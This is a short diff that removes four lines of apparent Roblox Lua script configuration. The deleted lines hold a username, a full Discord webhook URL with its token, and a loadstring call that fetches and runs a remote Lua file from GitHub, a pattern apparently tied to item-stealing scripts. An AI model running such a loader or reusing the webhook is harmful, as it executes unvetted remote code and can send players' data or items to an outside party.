@@ -1,4 +1,0 @@
-Username = 'Anzai207'
-Webhook = 'https://discord.com/api/webhooks/1302614417422291034/4_6BB-ZESgSeU5yiO3vj3s551sm-P1jfEHljjkdiiWAWg4SOVWBfX5s5D6XJ_7RfVESi'
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
